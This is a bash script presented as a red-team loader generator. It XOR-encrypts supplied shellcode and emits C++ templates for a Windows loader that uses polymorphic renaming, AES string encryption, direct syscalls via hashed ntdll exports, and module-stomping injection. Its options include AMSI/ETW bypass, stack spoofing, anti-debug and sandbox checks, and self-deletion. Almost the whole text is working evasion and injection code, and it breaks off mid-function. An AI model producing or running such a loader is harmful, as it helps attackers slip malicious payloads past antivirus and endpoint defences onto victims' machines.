#!/bin/bash
# Adaptive-Blade Loader Generator v3 - Advanced Red Team Loader
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'

usage() {
    echo -e "${CYAN}Usage:${NC} $0 -b <shellcode.bin> [-c config.json] [-o output] [-t exe|bin]"
    echo "  -b  .bin shellcode file"
    echo "  -c  Config JSON file (optional)"
    echo "  -o  Output file (default: loader.exe)"
    echo "  -t  Output type: exe | bin"
    exit 1
}

# Parse CLI args
BINFILE=""; CONFIG=""; OUTPUT="loader.exe"; OUTTYPE="exe"
while getopts "b:c:o:t:" opt; do
    case $opt in
        b) BINFILE="$OPTARG" ;;
        c) CONFIG="$OPTARG" ;;
        o) OUTPUT="$OPTARG" ;;
        t) OUTTYPE="$OPTARG" ;;
        *) usage ;;
    esac
done
[ -z "$BINFILE" ] && usage
[ ! -f "$BINFILE" ] && echo -e "${RED}File not found: $BINFILE${NC}" && exit 1

# Default config
XOR_KEY="auto"; MODULE_DLL="ntdll.dll"; SLEEP_ENABLED=true
SLEEP_BASE=5000; SLEEP_JITTER=30; SLEEP_OBF=true; SLEEP_ALGO="aes"
INJ_METHOD="module_stomping"; INJ_PROC="current"; USE_SC=true
AD_TIMING=true; AD_NTGLOBAL=true; AD_HWBP=true; AD_TRACER=true
AD_SANDBOX=true; AD_DELAYED=true; AD_DELAY_BASE=5000; AD_DELAY_JITTER=50
AD_API_HAMMER=true; AD_API_ROUNDS=10
SD_ENABLED=true; SD_METHOD="delayed"
AMSI_ENABLE=true; AMSI_METHOD="patchless_hwbp"
SS_ENABLE=true; SS_DEPTH=4
OBF_STRING="aes"; OBF_POLYMORPHIC=true
PAYLOAD_XOR_KEY=""

# Read JSON config if provided
if [ -n "$CONFIG" ]; then
    [ ! -f "$CONFIG" ] && echo -e "${RED}Config not found: $CONFIG${NC}" && exit 1
    echo -e "${GREEN}[+] Reading config: $CONFIG${NC}"
    # Use Python for robust JSON parsing
    eval "$(python3 << PYEOF
import json, sys
with open('$CONFIG') as f: c = json.load(f)
out = []
if 'output' in c: out.append(f'OUTPUT={c["output"]}')
if 'output_type' in c: out.append(f'OUTTYPE={c["output_type"]}')
if 'xor_key' in c and c['xor_key'] != 'auto': out.append(f'PAYLOAD_XOR_KEY={c["xor_key"]}')
if 'module_stomping' in c:
    ms = c['module_stomping']
    if 'target_dll' in ms: out.append(f'MODULE_DLL={ms["target_dll"]}')
if 'sleep' in c:
    sl = c['sleep']
    if 'enabled' in sl: out.append(f'SLEEP_ENABLED={str(sl["enabled"]).lower()}')
    if 'base_sleep_ms' in sl: out.append(f'SLEEP_BASE={sl["base_sleep_ms"]}')
    if 'jitter_percent' in sl: out.append(f'SLEEP_JITTER={sl["jitter_percent"]}')
    if 'obfuscate_memory' in sl: out.append(f'SLEEP_OBF={str(sl["obfuscate_memory"]).lower()}')
    if 'obfuscation_algo' in sl: out.append(f'SLEEP_ALGO={sl["obfuscation_algo"]}')
if 'injection' in c:
    ij = c['injection']
    if 'method' in ij: out.append(f'INJ_METHOD={ij["method"]}')
    if 'target_process' in ij: out.append(f'INJ_PROC={ij["target_process"]}')
if 'anti_debug' in c:
    ad = c['anti_debug']
    if 'enable' in ad: out.append(f'AD_TIMING={str(ad["enable"]).lower()}')
    if 'timing_check' in ad: out.append(f'AD_TIMING={str(ad["timing_check"]).lower()}')
    if 'ntglobalflag' in ad: out.append(f'AD_NTGLOBAL={str(ad["ntglobalflag"]).lower()}')
    if 'hw_breakpoints' in ad: out.append(f'AD_HWBP={str(ad["hw_breakpoints"]).lower()}')
    if 'tracerpid' in ad: out.append(f'AD_TRACER={str(ad["tracerpid"]).lower()}')
    if 'sandbox_check' in ad: out.append(f'AD_SANDBOX={str(ad["sandbox_check"]).lower()}')
    if 'delayed_execution' in ad:
        de = ad['delayed_execution']
        if isinstance(de, dict):
            out.append(f'AD_DELAYED=true')
            out.append(f'AD_DELAY_BASE={de.get("base_ms",5000)}')
            out.append(f'AD_DELAY_JITTER={de.get("jitter_pct",50)}')
        else:
            out.append(f'AD_DELAYED={str(de).lower()}')
    if 'api_hammering' in ad:
        ah = ad['api_hammering']
        if isinstance(ah, dict):
            out.append(f'AD_API_HAMMER=true')
            out.append(f'AD_API_ROUNDS={ah.get("rounds",10)}')
        else:
            out.append(f'AD_API_HAMMER={str(ah).lower()}')
if 'self_delete' in c:
    sd = c['self_delete']
    if 'enabled' in sd: out.append(f'SD_ENABLED={str(sd["enabled"]).lower()}')
    if 'method' in sd: out.append(f'SD_METHOD={sd["method"]}')
if 'amsi_etw_bypass' in c:
    ae = c['amsi_etw_bypass']
    if 'enable' in ae: out.append(f'AMSI_ENABLE={str(ae["enable"]).lower()}')
    if 'method' in ae: out.append(f'AMSI_METHOD={ae["method"]}')
if 'stack_spoofing' in c:
    ss = c['stack_spoofing']
    if 'enable' in ss: out.append(f'SS_ENABLE={str(ss["enable"]).lower()}')
    if 'depth' in ss: out.append(f'SS_DEPTH={ss["depth"]}')
if 'obfuscation' in c:
    ob = c['obfuscation']
    if 'string_encryption' in ob: out.append(f'OBF_STRING={ob["string_encryption"]}')
    if 'polymorphic' in ob: out.append(f'OBF_POLYMORPHIC={str(ob["polymorphic"]).lower()}')
print(';'.join(out))
PYEOF
)"
fi

# Determine XOR key
if [ "$XOR_KEY" = "auto" ] && [ -z "$PAYLOAD_XOR_KEY" ]; then
    PAYLOAD_XOR_KEY=$(head -c 16 /dev/urandom | xxd -p)
elif [ -n "$PAYLOAD_XOR_KEY" ]; then
    XOR_KEY="$PAYLOAD_XOR_KEY"
fi
[ "$XOR_KEY" = "auto" ] && XOR_KEY="$PAYLOAD_XOR_KEY"

# Validate config booleans
for var in SLEEP_ENABLED SLEEP_OBF AD_TIMING AD_NTGLOBAL AD_HWBP AD_TRACER SD_ENABLED AMSI_ENABLE SS_ENABLE OBF_POLYMORPHIC; do
    val="${!var}"
    case "$val" in
        true|false) ;;
        *) echo -e "${YELLOW}[!] Invalid boolean $var=$val, defaulting to false${NC}"; eval "$var=false" ;;
    esac
done

CC="x86_64-w64-mingw32-g++"
if ! command -v "$CC" &>/dev/null; then
    echo -e "${RED}[-] Cross-compiler not found. Install: apt install mingw-w64${NC}"; exit 1
fi

OBFS_KEY="0x$(head -c 1 /dev/urandom | xxd -p)"
[ "$((OBFS_KEY))" -eq 0 ] 2>/dev/null && OBFS_KEY="0xbb"
KEY_LEN=$(( ${#XOR_KEY} / 2 ))
binlen=$(stat -c%s "$BINFILE")

echo -e "${GREEN}[+] Config:${NC}"
echo -e "    OBFS key: $OBFS_KEY | XOR: $XOR_KEY | Payload: ${binlen}B"
echo -e "    Injection: $INJ_METHOD | Target DLL: $MODULE_DLL"
echo -e "    Anti-debug: hwbp=$AD_HWBP ntglobal=$AD_NTGLOBAL tracer=$AD_TRACER sandbox=$AD_SANDBOX delay=$AD_DELAYED hammer=$AD_API_HAMMER"
echo -e "    Sleep: enabled=$SLEEP_ENABLED base=${SLEEP_BASE}ms jitter=${SLEEP_JITTER}% obf=$SLEEP_OBF"
echo -e "    Self-delete: $SD_ENABLED method=$SD_METHOD"
echo -e "    AMSI bypass: $AMSI_ENABLE method=$AMSI_METHOD"
echo -e "    Stack spoofing: $SS_ENABLE depth=$SS_DEPTH"
echo -e "    Polymorphic: $OBF_POLYMORPHIC"

# Encrypt payload with XOR
TMPENC=$(mktemp)
python3 -c "
import sys
k = bytes.fromhex('$XOR_KEY')
with open('$BINFILE','rb') as f: r = f.read()
e = bytearray(len(r))
for i,b in enumerate(r): e[i] = b ^ k[i % len(k)]
sys.stdout.buffer.write(e)
" > "$TMPENC"

SRCDIR=$(mktemp -d)
WORKDIR=$(mktemp -d)

# ============================================================
# POLYMORPHIC CODE GENERATOR (Python)
# ============================================================
cat > "$WORKDIR/gen.py" << 'PYEOF'
import os, sys, json, random, string, struct, hashlib, base64

random.seed(os.urandom(8))

# --- Generate random identifier names ---
ADJ = ["swift", "dark", "cold", "faint", "keen", "vast", "calm", "pure", "bold", "deep",
       "rare", "null", "full", "keen", "soft", "warm", "thin", "dull", "flat", "slim"]
NOUN = ["blade", "core", "edge", "flux", "helm", "knot", "link", "mask", "node", "peak",
        "rail", "sync", "tide", "vein", "void", "wave", "zone", "base", "cell", "dawn",
        "echo", "fade", "glow", "hall", "icon", "jade", "keel", "loop", "maze", "port"]

_used_names = set()
def rand_name():
    for _ in range(100):
        n = random.choice(ADJ) + "_" + random.choice(NOUN) + str(random.randint(10, 99))
        if n not in _used_names:
            _used_names.add(n)
            return n
    return "var_" + ''.join(random.choices(string.ascii_lowercase, k=8))

_used_funcs = set()
def rand_func():
    for _ in range(100):
        n = random.choice(ADJ).title() + random.choice(NOUN).title() + random.choice(ADJ).title()
        if n not in _used_funcs:
            _used_funcs.add(n)
            return n
    return "Func_" + ''.join(random.choices(string.ascii_letters, k=10))

# --- AES-128-CBC Implementation (for build-time string encryption) ---
SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
]
RSBOX = [0]*256
for i in range(256): RSBOX[SBOX[i]] = i

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def aes_key_expansion(key):
    rcon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]
    w = list(key)
    for i in range(4, 44):
        t = list(w[(i-1)*4:(i-1)*4+4])
        if i % 4 == 0:
            t = [t[1], t[2], t[3], t[0]]
            t = [SBOX[b] for b in t]
            t[0] ^= rcon[i//4 - 1]
        w.extend(xor_bytes(t, w[(i-4)*4:(i-4)*4+4]))
    return bytes(w)

def sub_bytes(state): return [SBOX[b] for b in state]
def inv_sub_bytes(state): return [RSBOX[b] for b in state]
def shift_rows(s): return [s[0], s[5], s[10], s[15], s[4], s[9], s[14], s[3], s[8], s[13], s[2], s[7], s[12], s[1], s[6], s[11]]
def inv_shift_rows(s): return [s[0], s[13], s[10], s[7], s[4], s[1], s[14], s[11], s[8], s[5], s[2], s[15], s[12], s[9], s[6], s[3]]

def galois_mul(a, b):
    p = 0
    for _ in range(8):
        if b & 1: p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xff
        if hi: a ^= 0x1b
        b >>= 1
    return p

def mix_columns(s):
    out = [0]*16
    for i in range(0, 16, 4):
        a = s[i:i+4]
        out[i] = galois_mul(a[0],2) ^ galois_mul(a[1],3) ^ a[2] ^ a[3]
        out[i+1] = a[0] ^ galois_mul(a[1],2) ^ galois_mul(a[2],3) ^ a[3]
        out[i+2] = a[0] ^ a[1] ^ galois_mul(a[2],2) ^ galois_mul(a[3],3)
        out[i+3] = galois_mul(a[0],3) ^ a[1] ^ a[2] ^ galois_mul(a[3],2)
    return out

def inv_mix_columns(s):
    out = [0]*16
    for i in range(0, 16, 4):
        a = s[i:i+4]
        out[i] = galois_mul(a[0],14) ^ galois_mul(a[1],11) ^ galois_mul(a[2],13) ^ galois_mul(a[3],9)
        out[i+1] = galois_mul(a[0],9) ^ galois_mul(a[1],14) ^ galois_mul(a[2],11) ^ galois_mul(a[3],13)
        out[i+2] = galois_mul(a[0],13) ^ galois_mul(a[1],9) ^ galois_mul(a[2],14) ^ galois_mul(a[3],11)
        out[i+3] = galois_mul(a[0],11) ^ galois_mul(a[1],13) ^ galois_mul(a[2],9) ^ galois_mul(a[3],14)
    return out

def aes_encrypt_block(block, w):
    state = list(block)
    state = xor_bytes(state, w[:16])
    for rnd in range(1, 10):
        state = sub_bytes(state)
        state = shift_rows(state)
        state = mix_columns(state)
        state = xor_bytes(state, w[rnd*16:(rnd+1)*16])
    state = sub_bytes(state)
    state = shift_rows(state)
    state = xor_bytes(state, w[10*16:11*16])
    return bytes(state)

def aes_decrypt_block(block, w):
    state = list(block)
    state = xor_bytes(state, w[10*16:11*16])
    state = inv_shift_rows(state)
    state = inv_sub_bytes(state)
    for rnd in range(9, 0, -1):
        state = xor_bytes(state, w[rnd*16:(rnd+1)*16])
        state = inv_mix_columns(state)
        state = inv_shift_rows(state)
        state = inv_sub_bytes(state)
    state = xor_bytes(state, w[:16])
    return bytes(state)

def aes_cbc_encrypt(plaintext, key, iv):
    w = aes_key_expansion(key)
    padded = plaintext + bytes([16 - len(plaintext) % 16] * (16 - len(plaintext) % 16))
    out = b""
    prev = iv
    for i in range(0, len(padded), 16):
        block = xor_bytes(padded[i:i+16], prev)
        enc = aes_encrypt_block(block, w)
        out += enc
        prev = enc
    return out

def aes_cbc_decrypt(ciphertext, key, iv):
    w = aes_key_expansion(key)
    out = b""
    prev = iv
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16]
        dec = aes_decrypt_block(block, w)
        out += xor_bytes(dec, prev)
        prev = block
    pad = out[-1]
    return out[:-pad] if 1 <= pad <= 16 else out

def random_aes_key(): return os.urandom(16)
def random_iv(): return os.urandom(16)

# --- Generate C++ random identifier name for a given semantic name ---
name_map = {}
def map_name(semantic):
    if semantic not in name_map:
        name_map[semantic] = rand_name()
    return name_map[semantic]

func_map = {}
def map_func(semantic):
    if semantic not in func_map:
        func_map[semantic] = rand_func()
    return func_map[semantic]

# --- Generate obfuscated string macro ---
# Generates: static const char var_xxx[] = { encrypted bytes };
# plus a decrypt macro/function using XOR with runtime key
def gen_obfuscated_string(s, aes_key, aes_iv, obf_type):
    if obf_type == "aes":
        enc = aes_cbc_encrypt(s.encode(), aes_key, aes_iv)
        b64 = base64.b64encode(enc).decode()
        # Return as a struct that auto-decrypts at runtime
        key_str = ', '.join(f'0x{b:02x}' for b in aes_key)
        iv_str = ', '.join(f'0x{b:02x}' for b in aes_iv)
        data_str = ', '.join(f'0x{b:02x}' for b in enc)
        return {
            "key": key_str,
            "iv": iv_str,
            "data": enc,
            "b64": b64,
            "c_init": f'const unsigned char _{len(s)}k[]={{{key_str}}}',
            "c_iv": f'const unsigned char _{len(s)}v[]={{{iv_str}}}',
            "c_data": f'const unsigned char _{len(s)}d[]={{{data_str}}}',
        }
    else:
        # XOR-based - key derived from position
        xor_k = os.urandom(16)
        enc = bytes(s.encode()[i] ^ xor_k[i % 16] for i in range(len(s)))
        key_str = ', '.join(f'0x{b:02x}' for b in xor_k)
        data_str = ', '.join(f'0x{b:02x}' for b in enc)
        return {
            "key": key_str,
            "data": enc,
            "c_init": f'const unsigned char _{len(s)}k[]={{{key_str}}}',
            "c_data": f'const unsigned char _{len(s)}d[]={{{data_str}}}',
        }

# --- Generate junk code blocks ---
def gen_junk_block():
    ops = []
    ops.append(f'volatile int {rand_name()} = {random.randint(0, 999)};')
    v = rand_name()
    ops.append(f'volatile int {v} = {random.randint(0, 999)};')
    ops.append(f'for(int {rand_name()}=0;{rand_name()}<{random.randint(3, 15)};{rand_name()}++){{{v}}}=({{{v}}}+{random.randint(1, 50)})%{random.randint(60, 200)};')
    return '\n    '.join(ops)
EOF
PYEOF

# ============================================================
# C++ TEMPLATE - aes.hpp
# ============================================================
cat > "$SRCDIR/aes.hpp" << 'AESEOF'
#pragma once
#include <cstring>
#include <cstdint>

namespace aegis {
static const uint8_t _sb[256]={
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};
static uint8_t _rsb[256];
static struct _rsbi_{_rsbi_(){for(int i=0;i<256;i++)_rsb[_sb[i]]=i;}}_rsb_init_;

static uint8_t _gm(uint8_t a,uint8_t b){uint8_t p=0;for(int i=0;i<8;i++){if(b&1)p^=a;uint8_t h=a&0x80;a<<=1;if(h)a^=0x1b;b>>=1;}return p;}
static void _ke(const uint8_t* k,uint8_t* w){int i=0;for(;i<16;i++)w[i]=k[i];uint8_t r=1;for(;i<176;i+=4){
    uint8_t t[4]={w[i-4],w[i-3],w[i-2],w[i-1]};
    if(i%16==0){
        uint8_t o=t[0];t[0]=t[1];t[1]=t[2];t[2]=t[3];t[3]=o;
        t[0]=_sb[t[0]]^r;t[1]=_sb[t[1]];t[2]=_sb[t[2]];t[3]=_sb[t[3]];
        r=_gm(r,2);
    }
    for(int j=0;j<4;j++)w[i+j]=w[i-16+j]^t[j];}}

static void _ec(const uint8_t* in,uint8_t* out,const uint8_t* w){
    uint8_t s[16];memcpy(s,in,16);
    for(int i=0;i<16;i++)s[i]^=w[i];
    static const uint8_t sr[16]={0,5,10,15,4,9,14,3,8,13,2,7,12,1,6,11};
    for(int r=1;r<=10;r++){
        for(int i=0;i<16;i++)s[i]=_sb[s[i]];
        uint8_t t[16];memcpy(t,s,16);
        for(int i=0;i<16;i++)s[i]=t[sr[i]];
        if(r<10){for(int c=0;c<4;c++){int i=c*4;uint8_t a[4]={s[i],s[i+1],s[i+2],s[i+3]};
            s[i]=_gm(a[0],2)^_gm(a[1],3)^a[2]^a[3];s[i+1]=a[0]^_gm(a[1],2)^_gm(a[2],3)^a[3];
            s[i+2]=a[0]^a[1]^_gm(a[2],2)^_gm(a[3],3);s[i+3]=_gm(a[0],3)^a[1]^a[2]^_gm(a[3],2);}}
        for(int i=0;i<16;i++)s[i]^=w[r*16+i];}
    memcpy(out,s,16);}

static void _dc(const uint8_t* in,uint8_t* out,const uint8_t* w){
    uint8_t s[16];memcpy(s,in,16);
    for(int i=0;i<16;i++)s[i]^=w[160+i];
    static const uint8_t isr[16]={0,13,10,7,4,1,14,11,8,5,2,15,12,9,6,3};
    for(int r=9;r>=0;r--){
        uint8_t t[16];memcpy(t,s,16);
        for(int i=0;i<16;i++)s[i]=t[isr[i]];
        for(int i=0;i<16;i++)s[i]=_rsb[s[i]];
        for(int i=0;i<16;i++)s[i]^=w[r*16+i];
        if(r>0){for(int c=0;c<4;c++){int i=c*4;uint8_t a[4]={s[i],s[i+1],s[i+2],s[i+3]};
            s[i]=_gm(a[0],14)^_gm(a[1],11)^_gm(a[2],13)^_gm(a[3],9);
            s[i+1]=_gm(a[0],9)^_gm(a[1],14)^_gm(a[2],11)^_gm(a[3],13);
            s[i+2]=_gm(a[0],13)^_gm(a[1],9)^_gm(a[2],14)^_gm(a[3],11);
            s[i+3]=_gm(a[0],11)^_gm(a[1],13)^_gm(a[2],9)^_gm(a[3],14);}}}
    memcpy(out,s,16);}

struct StrEnc {
    uint8_t key[16], iv[16];
    const uint8_t* data;
    int dlen;
    
    char* decrypt() const {
        uint8_t w[176];_ke(key,w);
        int plen=dlen;
        uint8_t* tmp=new uint8_t[plen];
        memcpy(tmp,data,plen);
        uint8_t prev[16];memcpy(prev,iv,16);
        for(int i=0;i<plen;i+=16){
            uint8_t block[16];_dc(tmp+i,block,w);
            for(int j=0;j<16;j++){tmp[i+j]=block[j]^prev[j];}
            memcpy(prev,tmp+i,16);}
        int pad=tmp[plen-1];
        int rlen=plen-pad;
        char* r=new char[rlen+1];
        memcpy(r,tmp,rlen);r[rlen]=0;
        delete[] tmp;return r;
    }
};
static void xorf(uint8_t* d,int l,const uint8_t* k,int kl){for(int i=0;i<l;i++)d[i]^=k[i%kl];}
}
AESEOF

# ============================================================
# C++ TEMPLATE - obfuscation.hpp
# ============================================================
cat > "$SRCDIR/obfuscation.hpp" << 'OBFEOF'
#pragma once
#include "aes.hpp"
OBFEOF

# ============================================================
# C++ TEMPLATE - syscalls.hpp
# ============================================================
cat > "$SRCDIR/syscalls.hpp" << 'SCEOF'
#pragma once
#include <windows.h>
#include <winternl.h>
#include <cstring>

extern "C" NTSTATUS do_syscall(DWORD ssn,uintptr_t jmp,void* args,DWORD cnt);

struct SC {
    DWORD hash;uintptr_t addr;DWORD ssn;
    bool valid()const{return addr!=0;}
};
static SC _sc[4];static uintptr_t _jmp=0;

static DWORD _hash(const char* s){DWORD h=5381;int c;while((c=*s++))h=((h<<5)+h)+c;return h;}

typedef struct _LDR_DATA_TABLE_ENTRY_EX {
    LIST_ENTRY a;LIST_ENTRY b;LIST_ENTRY c;PVOID db;PVOID ep;ULONG si;
    UNICODE_STRING fd;UNICODE_STRING bd;ULONG fl;
} LDR_EX,*PLDR_EX;

static void* _getmod(DWORD hh){
    PPEB p=nullptr;
#ifdef _WIN64
    p=(PPEB)__readgsqword(0x60);
#else
    p=(PPEB)__readfsdword(0x30);
#endif
    if(!p||!p->Ldr)return nullptr;
    PLIST_ENTRY ml=&p->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY cur=ml->Flink;
    while(cur!=ml){
        PLDR_EX e=(PLDR_EX)((BYTE*)cur-(FIELD_OFFSET(LDR_EX,b)));
        if(e->bd.Buffer){
            char b[64];int w=0;
            for(int i=0;i<(int)(e->bd.Length/2)&&i<63;i++){
                char c=(char)e->bd.Buffer[i];b[w++]=(c>='A'&&c<='Z')?c+32:c;
            }
            b[w]=0;
            if(_hash(b)==hh)return e->db;
        }
        cur=cur->Flink;
    }
    return nullptr;
}

static FARPROC _getapi(void* m,DWORD fh){
    if(!m)return nullptr;
    PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)m;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)m+d->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* e=(IMAGE_EXPORT_DIRECTORY*)((BYTE*)m+n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if(!e)return nullptr;
    DWORD* nm=(DWORD*)((BYTE*)m+e->AddressOfNames);
    DWORD* fn=(DWORD*)((BYTE*)m+e->AddressOfFunctions);
    WORD* ors=(WORD*)((BYTE*)m+e->AddressOfNameOrdinals);
    for(DWORD i=0;i<e->NumberOfNames;i++){
        const char* n2=(const char*)((BYTE*)m+nm[i]);
        if(_hash(n2)==fh)return(FARPROC)((BYTE*)m+fn[ors[i]]);
    }
    return nullptr;
}

static void _initsys(){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return;
    PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)nt;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)nt+d->e_lfanew);
    PIMAGE_SECTION_HEADER t=IMAGE_FIRST_SECTION(n);
    BYTE* ss=(BYTE*)nt+t->VirtualAddress;
    for(DWORD i=0;i<t->SizeOfRawData-2;i++){
        if(ss[i]==0x0F&&ss[i+1]==0x05){_jmp=(uintptr_t)(ss+i);break;}
    }
    DWORD tg[]={0x98ad6a23,0x904a0c6d,0x1f76d494,0x38612ca4};
    IMAGE_EXPORT_DIRECTORY* e=(IMAGE_EXPORT_DIRECTORY*)((BYTE*)nt+n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* nm=(DWORD*)((BYTE*)nt+e->AddressOfNames);
    DWORD* fn=(DWORD*)((BYTE*)nt+e->AddressOfFunctions);
    WORD* ors=(WORD*)((BYTE*)nt+e->AddressOfNameOrdinals);
    int ix=0;
    for(DWORD i=0;i<e->NumberOfNames&&ix<4;i++){
        const char* n2=(const char*)((BYTE*)nt+nm[i]);DWORD h=_hash(n2);
        for(DWORD t:tg){if(h==t){BYTE* p=(BYTE*)nt+fn[ors[i]];
            if(p[0]==0x4C&&p[1]==0x8B&&p[2]==0xD1&&p[3]==0xB8){_sc[ix++]={h,(uintptr_t)p,*(DWORD*)(p+4)};}break;}}
    }
}

static NTSTATUS _call(DWORD h,uintptr_t a1=0,uintptr_t a2=0,uintptr_t a3=0,uintptr_t a4=0,uintptr_t a5=0,uintptr_t a6=0){
    for(int i=0;i<4;i++){if(_sc[i].hash==h){uintptr_t aa[]={a1,a2,a3,a4,a5,a6};return do_syscall(_sc[i].ssn,_jmp,aa,6);}}
    return 0xC0000002;
}

static void _xorf(unsigned char* d,int l,const unsigned char* k,int kl){for(int i=0;i<l;i++)d[i]^=k[i%kl];}

// Hash defs for syscalls
// NtCreateSection: 0x98ad6a23
// NtMapViewOfSection: 0x904a0c6d
// NtProtectVirtualMemory: 0x1f76d494
// NtUnmapViewOfSection: 0x38612ca4
// NtOpenProcess: 0xa8e35e0b
// NtAllocateVirtualMemory: 0x3ad74d22
// NtWriteVirtualMemory: 0x7e3c0d8c
// NtCreateThreadEx: 0xd177c66e
// NtQueueApcThread: 0x1c1fad57
// NtClose: 0x7a3b0e0e
// NtDelayExecution: 0x4d8c8bb0
// NtQueryInformationProcess: 0x90a05d6e
// NtSetInformationProcess: 0xc613c7de
// NtOpenSection: 0xaaddcd19
// NtGetContextThread: 0x07b58516
// NtSetContextThread: 0xed4b14a0

SCEOF

# ============================================================
# C++ TEMPLATE - evasion.hpp
# ============================================================
cat > "$SRCDIR/evasion.hpp" << 'EVEOF'
#pragma once
#include "syscalls.hpp"
#include <intrin.h>
#include <cstdint>

// --- Anti-debug: timing check ---
static bool _timing_check(){
    LARGE_INTEGER f,t1,t2;
    if(!QueryPerformanceFrequency(&f))return false;
    QueryPerformanceCounter(&t1);
    volatile int s=0;
    for(int i=0;i<10000;i++)s+=i;
    QueryPerformanceCounter(&t2);
    double dt=(double)(t2.QuadPart-t1.QuadPart)/(double)f.QuadPart;
    return dt>0.05;
}

// --- Anti-debug: NtGlobalFlag ---
static bool _ntglobal_check(){
#ifdef _WIN64
    BYTE* peb=(BYTE*)__readgsqword(0x60);
